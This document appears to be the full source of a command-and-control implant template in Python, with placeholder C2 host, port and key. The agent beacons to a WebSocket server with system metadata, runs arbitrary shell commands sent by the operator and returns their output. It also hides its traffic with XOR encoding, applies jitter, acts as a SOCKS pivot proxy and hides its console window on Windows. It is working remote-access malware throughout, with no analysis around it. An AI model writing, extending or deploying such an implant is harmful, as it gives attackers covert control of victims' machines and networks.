#!/usr/bin/env python3
import asyncio
import websockets
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
RECONNECT_DELAY = 5
BEACON_MODE = {{BEACON_MODE}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}  # Percentage (0-100)


def simple_encrypt(data: str) -> str:
    """XOR encryption"""
    key = b'{{ENCRYPTION_KEY}}'
    encoded = data.encode()
    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
    return base64.b64encode(encrypted).decode()


def simple_decrypt(data: str) -> str:
    """XOR decryption"""
    key = b'{{ENCRYPTION_KEY}}'
    decoded = base64.b64decode(data.encode())
    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
    return decrypted.decode()


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    """Calculate sleep time with jitter applied"""
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)

    import random
    # Calculate jitter range: interval ± (interval * jitter / 100)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount

    # Return random value within range
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def execute_command(command: str) -> str:
    """Execute system command and return output"""
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"

        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=os.getcwd()
        )

        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"

    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


async def heartbeat(websocket):
    """Send periodic heartbeat"""
    while True:
        try:
            message = {'type': 'heartbeat'}
            encrypted = simple_encrypt(json.dumps(message))
            await websocket.send(encrypted)
            await asyncio.sleep(10)
        except:
            break


async def socks_proxy_handler(websocket, host: str, port: int):
    """Handle SOCKS proxy connection"""
    try:
        reader, writer = await asyncio.open_connection(host, port)

        async def relay_to_server():
            try:
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    msg = {
                        'type': 'socks_data',
                        'data': base64.b64encode(data).decode()
                    }
                    encrypted = simple_encrypt(json.dumps(msg))
                    await websocket.send(encrypted)
            except:
                pass

        return relay_to_server, writer

    except Exception as e:
        return None, None


async def connect_to_server():
    """Main agent connection loop"""
    uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
    socks_relay_task = None
    socks_writer = None
    current_mode = 'beacon' if BEACON_MODE else 'streaming'
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None  # Persist agent_id across beacon cycles
    pending_results = []  # Store command results for next checkin
    pending_commands = []  # Store commands to execute offline

    while True:
        try:
            async with websockets.connect(uri, max_size=10485760) as websocket:
                metadata = get_metadata()
                metadata['mode'] = current_mode
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter

                # Use checkin if we already have an agent_id, otherwise register
                if agent_id:
                    checkin_msg = {
                        'type': 'checkin',
                        'agent_id': agent_id,
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(checkin_msg))
                else:
                    register_msg = {
                        'type': 'register',
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(register_msg))

                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    # Always update agent_id if server sends one (handles server restart case)
                    new_id = reg_data.get('agent_id')
                    if new_id and new_id != agent_id:
                        agent_id = new_id
                    heartbeat_task = None

                    if current_mode == 'streaming':
                        heartbeat_task = asyncio.create_task(heartbeat(websocket))

                    # Beacon mode: send results AFTER getting ack, then fetch commands
                    if current_mode == 'beacon':
                        # Wait a moment for command to be queued
                        await asyncio.sleep(0.1)

                        # Step 1: Send any pending results from previous cycle
                        if pending_results:
                            for result in pending_results:
                                try:
                                    encrypted_response = simple_encrypt(json.dumps(result))
                                    await websocket.send(encrypted_response)
                                except Exception:
                                    pass
                            pending_results.clear()

                        # Step 2: Fetch all queued commands (non-blocking)
                        pending_commands.clear()
                        while True:
                            try:
                                message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                                decrypted = simple_decrypt(message)
                                data = json.loads(decrypted)

                                if data.get('type') == 'command':
                                    # Store command for offline execution
                                    pending_commands.append({
                                        'command': data.get('command', ''),
                                        'timestamp': data.get('timestamp', '')
                                    })

                                elif data.get('type') == 'set_interval':
                                    beacon_interval = data.get('interval', beacon_interval)

                                elif data.get('type') == 'kill':
                                    # Exit agent
                                    import sys
                                    sys.exit(0)

                                elif data.get('type') == 'upgrade_mode':
                                    current_mode = 'streaming'
                                    # Start heartbeat for streaming mode
                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))
                                    mode_msg = {
                                        'type': 'mode_change',
                                        'mode': 'streaming'
                                    }
                                    encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                    await websocket.send(encrypted_msg)
                                    # Don't break - fall through to streaming mode
                                    pending_commands.clear()
                                    break

                            except asyncio.TimeoutError:
                                # No more commands, proceed to disconnect
                                break

                        # Step 3: If still in beacon mode, execute commands offline
                        if current_mode == 'beacon':
                            # Execute all commands during sleep period
                            for cmd_data in pending_commands:
                                try:
                                    output = execute_command(cmd_data['command'])
                                    # Store result for next checkin
                                    pending_results.append({
                                        'type': 'response',
                                        'output': output,
                                        'command': cmd_data['command'],
                                        'timestamp': cmd_data['timestamp']
                                    })
                                except Exception as e:
                                    pending_results.append({
                                        'type': 'response',
                                        'output': f"Error executing command: {str(e)}",
                                        'command': cmd_data['command'],
                                        'timestamp': cmd_data['timestamp']
                                    })

                            # Sleep for beacon interval (with jitter)
                            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
                            await asyncio.sleep(sleep_time)
                            continue

                        # If we upgraded to streaming, don't disconnect - continue to streaming loop

                    # Streaming mode: maintain persistent connection
                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)

                            if data.get('type') == 'command':
                                command = data.get('command', '')
                                output = execute_command(command)

                                response = {
                                    'type': 'response',
                                    'output': output
                                }
                                encrypted_response = simple_encrypt(json.dumps(response))
                                await websocket.send(encrypted_response)

                            elif data.get('type') == 'set_interval':
                                beacon_interval = data.get('interval', beacon_interval)

                            elif data.get('type') == 'kill':
                                # Exit agent
                                import sys
                                sys.exit(0)

                            elif data.get('type') == 'upgrade_mode':
                                current_mode = 'streaming'
                                if heartbeat_task is None:
                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'streaming'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)

                            elif data.get('type') == 'downgrade_mode':
                                current_mode = 'beacon'
                                beacon_interval = data.get('interval', beacon_interval)
                                if heartbeat_task:
                                    heartbeat_task.cancel()
                                    heartbeat_task = None

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'beacon'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)
                                # Break out to beacon mode
                                break

                            elif data.get('type') == 'socks_init':
                                pass

                            elif data.get('type') == 'socks_connect':
                                host = data.get('host')
                                port = data.get('port')
                                relay_coro, socks_writer = await socks_proxy_handler(websocket, host, port)
                                if relay_coro:
                                    socks_relay_task = asyncio.create_task(relay_coro())

                            elif data.get('type') == 'socks_send':
                                if socks_writer:
                                    socks_data = base64.b64decode(data.get('data', ''))
                                    socks_writer.write(socks_data)
                                    await socks_writer.drain()

                        except Exception as e:
                            pass

                    if heartbeat_task:
                        heartbeat_task.cancel()
                    if socks_relay_task:
                        socks_relay_task.cancel()
                    if socks_writer:
                        socks_writer.close()
                        await socks_writer.wait_closed()

        except Exception as e:
            pass

        # Reconnect delay for streaming or on error
        if current_mode == 'streaming':
            await asyncio.sleep(RECONNECT_DELAY)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    try:
        asyncio.run(connect_to_server())
    except KeyboardInterrupt:
        pass
